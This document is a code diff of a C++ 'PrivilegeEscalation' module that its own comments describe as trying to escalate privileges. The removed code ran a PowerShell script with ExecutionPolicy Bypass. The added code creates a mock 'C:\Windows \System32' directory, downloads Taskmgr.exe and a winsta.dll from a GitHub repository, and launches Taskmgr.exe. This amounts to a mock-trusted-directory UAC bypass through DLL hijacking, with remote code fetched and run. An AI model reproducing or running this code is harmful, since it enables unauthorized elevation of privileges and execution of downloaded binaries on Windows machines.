@@ -1,22 +1,19 @@
 #include "PrivilegeEscalation.h"
 
+
 // This function tries to privilege escalation
 const bool PrivilegeEscalation::run(void)
 {
-    // Create Powershell file and run
-    std::string tempPath = System::getTempPath() + "\\Temp.ps1";
-    std::ofstream file;
-    file.open(tempPath);
-    file << "New-Item \"\\\\?\\C:\\Windows \\System32\" -ItemType Directory 2>&1>$null" << std::endl;
-    file << "$ProgressPreference = 'SilentlyContinue'" << std::endl;
-    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe\" -outfile \"C:\\Windows \\System32\\Taskmgr.exe\" 2>&1>$null" << std::endl;
-    file << "wget \"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll\" -outfile \"C:\\Windows \\System32\\winsta.dll\" 2>&1>$null" << std::endl;
-    file.close();
-    std::string command = "powershell -ExecutionPolicy Bypass -F " + tempPath; // Run the powershell file
-    system(command.c_str());
-    remove(tempPath.c_str());
+    // Mocking System32 Directory
+    CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
+    CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);
 
-    // Checking Powershell results
+    // Downloading Taskmge.exe into mocked System32 from Git Repository
+    bool taskmgr = System::downloadFile(L"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/Taskmgr.exe", L"\\\\?\\C:\\Windows \\System32\\Taskmgr.exe");
+    // Downloading Winsta.dll into mocked System32 from Git Repository
+    bool winsta = System::downloadFile(L"https://github.com/Eyalasulin999/FileForPrivilegeEscalation/raw/main/winsta.dll", L"\\\\?\\C:\\Windows \\System32\\Winsta.dll");
+
+    // Checking for Files and Run Them
     if (System::fileExist("C:\\Windows \\System32\\Taskmgr.exe") && System::fileExist("C:\\Windows \\System32\\winsta.dll"))
     {
         System::createProcess("cmd.exe /c \"C:\\Windows \\System32\\Taskmgr.exe\"");
